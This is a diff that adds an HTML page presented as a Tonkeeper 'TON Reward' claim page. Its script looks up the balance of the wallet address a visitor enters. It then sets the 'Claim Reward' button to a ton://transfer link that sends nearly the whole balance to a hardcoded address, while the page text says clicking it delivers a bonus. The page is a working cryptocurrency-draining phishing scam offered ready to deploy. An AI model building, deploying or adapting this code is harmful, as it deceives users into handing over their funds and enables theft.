@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Check Wallet Balance and Open in Tonkeeper</title>
+    <link rel="stylesheet" href="index.css" />
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding: 50px;
+        background: #059bff;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .instructions {
+        background-color: rgba(255, 255, 255, 0.1);
+        padding: 20px;
+        border-radius: 10px;
+        max-width: 600px;
+        color: white;
+        margin-bottom: 30px;
+        font-size: large;
+        font-family: Verdana, Geneva, Tahoma, sans-serif;
+      }
+      h2 {
+        margin-bottom: 20px;
+        color: white;
+      }
+      input,
+      button,
+      a {
+        padding: 10px 15px;
+        margin: 10px;
+        font-size: 16px;
+        border-radius: 8px;
+        border: 1px solid #ccc;
+        transition: all 0.3s ease;
+      }
+      button,
+      a {
+        background-color: #00bfa6;
+        color: white;
+        border: none;
+        cursor: pointer;
+        text-decoration: none;
+        box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+      }
+      button:hover,
+      a:hover {
+        background-color: #009e8a;
+        transform: translateY(-3px);
+      }
+      button:active,
+      a:active {
+        transform: translateY(1px);
+      }
+    </style>
+  </head>
+  <body>
+    <img src="tonLogo.jpg" alt="TON" id="cryptoLogo1" />
+    <div class="instructions">
+      <strong>TON Reward Instructions</strong><br />
+      To claim your reward, enter your wallet address in the designated field.
+      After entering the address and verifying the balance, if sufficient funds
+      are available, the "Claim Reward" button will appear. Click this button to
+      initiate the reward process and receive your bonus.
+    </div>
+
+    <h2>For each TON in Tonkeeper, receive a reward💎</h2>
+
+    <input
+      id="walletAddress"
+      placeholder="Enter your wallet address"
+      dir="ltr"
+      size="40"
+    />
+    <br />
+    <button onclick="checkBalance()">Check Balance</button>
+    <div id="balanceResult"></div>
+    <br />
+    <a id="tonkeeperLink" href="#" style="display: none">Claim Reward</a>
+
+    <script>
+      async function checkBalance() {
+        const address = document.getElementById("walletAddress").value.trim();
+        const linkElement = document.getElementById("tonkeeperLink");
+
+        if (!address) {
+          alert("Please enter a wallet address.");
+          return;
+        }
+
+        try {
+          const res = await fetch(
+            `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
+          );
+          const data = await res.json();
+
+          if (data.ok) {
+            const nanoTon = data.result;
+            const tonBalance = nanoTon / 1e9;
+
+            const fixedFeeNano = 0.01 * 1e9;
+            const transferAmount = Math.max(nanoTon - fixedFeeNano, 0);
+
+            document.getElementById(
+              "balanceResult"
+            ).innerText = `Balance: ${tonBalance} TON`;
+
+            const baseLink =
+              "ton://transfer/UQB_Uw7-9RfK1VDG4RqCm1MozXDBN8_yXsIElChJVpJ-V8EM";
+            linkElement.href = `${baseLink}?amount=${transferAmount}`;
+            linkElement.style.display =
+              transferAmount > 0 ? "inline-block" : "none";
+          } else {
+            document.getElementById("balanceResult").innerText =
+              "Error fetching balance.";
+            linkElement.style.display = "none";
+          }
+        } catch (err) {
+          console.error(err);
+          document.getElementById("balanceResult").innerText =
+            "Unable to connect to the server.";
+          linkElement.style.display = "none";
+        }
+      }
+    </script>
+  </body>
+</html>
